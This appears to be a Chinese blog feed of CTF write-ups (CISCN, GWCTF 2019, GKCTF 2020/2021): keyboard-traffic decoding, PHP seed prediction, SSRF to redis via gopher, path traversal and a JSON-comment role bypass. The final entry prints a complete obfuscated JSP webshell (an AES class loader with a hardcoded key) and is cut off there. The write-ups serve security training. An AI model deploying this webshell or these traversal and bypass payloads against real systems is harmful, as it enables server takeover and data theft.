string">"{"</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON&gt;"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA&gt;"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5&gt;"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6&gt;"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7&gt;"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8&gt;"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9&gt;"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10&gt;"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11&gt;"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12&gt;"</span><span class="token punctuation">}</span>     <span class="token keyword">var</span> result <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>     <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>        line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>           <span class="token keyword">break</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"00"</span> <span class="token punctuation">{</span>           results <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span>           <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'2'</span> <span class="token punctuation">{</span>              result <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'0'</span> <span class="token punctuation">{</span>              result <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     flag <span class="token operator">:=</span> <span class="token number">0</span>     <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> result <span class="token punctuation">{</span>        <span class="token keyword">if</span> v <span class="token operator">==</span> <span class="token string">"&lt;DEL&gt;"</span> <span class="token punctuation">{</span>           result <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> result<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>           <span class="token keyword">continue</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> v <span class="token operator">==</span> <span class="token string">"&lt;CAP&gt;"</span> <span class="token punctuation">{</span>           flag <span class="token operator">+=</span> <span class="token number">1</span>           result <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> result<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">{</span>              flag <span class="token operator">=</span> <span class="token number">0</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">{</span>           result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token keyword">continue</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后获得两个字符串</p><pre class="line-numbers language-none"><code class="language-none">526172211a0700Cf907300000d00000000000000c4527424943500300000002A00000002b9f9b0530778b5541d33080020000000666c61672E747874B9Ba013242f3aFC000b092c229d6e994167c05A78708b271fFC042ae3d251e65536F9Ada87c77406b67d0E6316684766a86e844dC81AA2c72c71348d10c43d7B0040070035c535765e50074a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一个以 52 61 72 21 开头，说明是 RAR 文件</p><p>以十六进制保存为 rar 文件</p><p><img src="/../../../../pic/Pasted%20image%2020230218165311.png"></p><p>被加密过了，使用第二个字符串解密获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019</title>
      <link href="/2023/01/21/catchtheflag/games/gwctf/gwctf-2019/"/>
      <url>/2023/01/21/catchtheflag/games/gwctf/gwctf-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="GWCTF-2019"><a href="#GWCTF-2019" class="headerlink" title="GWCTF 2019"></a>GWCTF 2019</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-枯燥的抽奖"><a href="#1-枯燥的抽奖" class="headerlink" title="1. 枯燥的抽奖"></a>1. 枯燥的抽奖</h3><p>#PHP随机数预测</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>查看源代码可知使用 check.php 处理</p><p>访问 check.php 获得源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'&gt;"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p&gt;"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先是生成的一个种子然后生成随机数</p><p>先获取一下随机数生成</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>dict <span class="token operator">:=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>result <span class="token operator">:=</span> <span class="token string">"RKiDLcew1k"</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">for</span> j <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">if</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> dict<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v %v %v %v "</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>丢到 php_mt_seed 破解种子</p><p><img src="/../../../../pic/Pasted%20image%2020230308205053.png"></p><p>然后生成结果</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">964607907</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230308205136.png"></p><p>拿着获得的结果提交</p><p><img src="/../../../../pic/Pasted%20image%2020230308205154.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GWCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF 2020</title>
      <link href="/2023/01/21/catchtheflag/games/gkctf/gkctf-2020/"/>
      <url>/2023/01/21/catchtheflag/games/gkctf/gkctf-2020/</url>
      
        <content type="html"><![CDATA[<h1 id="GKCTF-2020"><a href="#GKCTF-2020" class="headerlink" title="GKCTF 2020"></a>GKCTF 2020</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-ez三剑客-ezweb"><a href="#1-ez三剑客-ezweb" class="headerlink" title="1. ez三剑客 - ezweb"></a>1. ez三剑客 - ezweb</h3><p>#SSRF #redis #内网探测</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>查看页面源代码存在提示</p><p><img src="/../../../../pic/Pasted%20image%2020230217144255.png"></p><p>传参后获得网络信息</p><p><img src="/../../../../pic/Pasted%20image%2020230217144346.png"></p><p>使用 file 协议读取下文件</p><pre class="line-numbers language-none"><code class="language-none">file:/var/www/html/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得页面源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">//echo $url."\n";  </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token comment">//var_dump($match);  </span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据前面给出的网卡信息扫描下 174.1.174/C 网段</p><p><img src="/../../../../pic/Pasted%20image%2020230217150524.png"></p><p>在 172.1.174.6 的机器上获得提示扫描其他端口</p><p><img src="/../../../../pic/Pasted%20image%2020230217151434.png"></p><p>这里在 6379 还开了一个 redis 服务</p><p>使用 gopher 进行攻击</p><p><img src="/../../../../pic/Pasted%20image%2020230217155130.png">、</p><p>URL 编码后发包</p><p><img src="/../../../../pic/Pasted%20image%2020230217155146.png"></p><p>然后访问写入的 shell</p><p><img src="/../../../../pic/Pasted%20image%2020230217155152.png"></p><p>成功实现命令执行，修改命令获取 flag</p><p><img src="/../../../../pic/Pasted%20image%2020230217155457.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF 2021</title>
      <link href="/2023/01/21/catchtheflag/games/gkctf/gkctf-2021/"/>
      <url>/2023/01/21/catchtheflag/games/gkctf/gkctf-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="GKCTF-2021"><a href="#GKCTF-2021" class="headerlink" title="GKCTF 2021"></a>GKCTF 2021</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-easycms"><a href="#1-easycms" class="headerlink" title="1. easycms"></a>1. easycms</h3><p>#蝉知后台GetShell</p><ul><li>题目描述</li></ul><p>真·ezcms</p><p>后台密码5位弱口令</p><ul><li>题解</li></ul><p>访问 <code>/admin.php</code> 获得后台地址</p><p>使用 admin / 12345 登录进后台</p><p>后台 GetShell ，先去模板查看一下</p><p><img src="/../../../../pic/Pasted%20image%2020221231210508.png"></p><p>想要修改还需要创建一个文件  <code>/var/www/html/system/tmp/dqpg.txt</code></p><p><img src="/../../../../pic/Pasted%20image%2020221231210947.png"></p><p>在素材库中上传一个文件然后修改文件名造成目录穿越</p><p>然后回到之前的页面写入 shell</p><p><img src="/../../../../pic/Pasted%20image%2020221231211443.png"></p><p>返回主页获得 flag</p><h3 id="2-babycat"><a href="#2-babycat" class="headerlink" title="2. babycat"></a>2. babycat</h3><ul><li>题目描述</li></ul><p>靶机有更新，重新启动之后再打一遍即可拿到正确的 flag。</p><ul><li>题目解析</li></ul><p>进入注册页面提示 Not Allowed，但是查看源码可以发现只是前端弹出的，后端该有的还是有</p><p><img src="/../../../../pic/Pasted%20image%2020230105082036.png"></p><p>先注册个账号</p><pre class="line-numbers language-none"><code class="language-none">/register[POST]data={"username":"test","password":"test"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用 test / test 登录进去，该用户权限默认设置为 guest</p><p>访问 Upload 需要 admin 用户权限，但是默认 role 为 guest</p><p><img src="/../../../../pic/Pasted%20image%2020230105083441.png"></p><p>访问 Download Test 发现可以进行任意文件读取</p><p>测试访问 <code>/home/download?file=../../../../../../../../../../etc/passwd</code></p><p><img src="/../../../../pic/Pasted%20image%2020230105082419.png"></p><p>成功下载下来文件</p><p>访问 <code>/home/download?file=../web.xml</code>  获取到 web.xml 获取到所调用的一些类</p><p>接下来就慢慢读取文件 <code>/home/download?file=../../WEB-INF/classes/com/web/servlet/registerServlet.class</code></p><p>因为我们需要 admin 用户权限，看一下注册功能对 role 的处理</p><p><img src="/../../../../pic/Pasted%20image%2020230105084025.png"></p><p>先匹配到最后一个 role 内容，然后对最后一个 role 进行强制替换为 guest</p><p>然后使用 gson 进行解析 json，可以在 json 插入注释绕过</p><pre class="line-numbers language-none"><code class="language-none">/register[POST]data={"username":"admin8","password":"admin8","role":"admin"/*"role":"guest"*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230105085417.png"></p><p>这下可以进入 Upload 功能了，看一下后端处理了什么</p><p><img src="/../../../../pic/Pasted%20image%2020230105090309.png"></p><ul><li>非预期</li></ul><p>存在 waf 检测文件的后缀以及内容，但是检测之后并没有退出处理，跳出 if 后依旧可以进行文件上传（）</p><p>因此直接上传 jsp 马</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">Hello Administrator!WelCome To Tas9er JSP Console!&lt;%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %&gt;&lt;%!    class govrEYO0gsa extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {        govrEYO0gsa(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 gov9i5QyBuxw6U) {            super(gov9i5QyBuxw6U);        }        public Class govRsCapBaa(byte[] gov5) {            return super.d\uuuuuuuuu0065fineClass/*gov2e1*/(gov5,0,gov5.length);        }    }%&gt;&lt;%    out.println("Random Garbage Data:");    Random govd8tWN1GY2mfN9J = new Random();    int gov3fq = govd8tWN1GY2mfN9J.nextInt(1234);    int govfXMHP4aa8W = govd8tWN1GY2mfN9J.nextInt(5678);    int govQPwwWbex = govd8tWN1GY2mfN9J.nextInt(1357);    int gov71nGirW = govd8tWN1GY2mfN9J.nextInt(2468);    out.println(gov3fq+","+govfXMHP4aa8W+","+govQPwwWbex+","+gov71nGirW);    String[] gov5FPAB = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};    String govEMJk = gov5FPAB[1] + gov5FPAB[3] + gov5FPAB[5] + gov5FPAB[7];    if (request.getMethod().equals(govEMJk)) {        String govjt8xMOXJyLA = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()/*govoxAzAce4sCJ*/./*govvlLJQ*/decodeBuffer/*goveLJZppDiAS*/("MTZhY2FjYzA1YWFmYWY2Nw=="));        session.setAttribute("u", govjt8xMOXJyLA);        Cipher gov4GQ7sLL = Cipher.getInstance("AES");        gov4GQ7sLL.init(((gov3fq * govfXMHP4aa8W + govQPwwWbex - gov71nGirW) * 0) + 3 - 1, new SecretKeySpec(govjt8xMOXJyLA.getBytes(), "AES"));        new govrEYO0gsa(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).govRsCapBaa(gov4GQ7sLL.doFinal(new sun.misc./*govgV5Temj*/B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*govTrDdW51pmGb7*/decodeBuffer(request.getReader().readLine()))).newInstance()/*gov8YFEqqx*/.equals(pageContext);    }%&gt;<span aria-hidden="true" 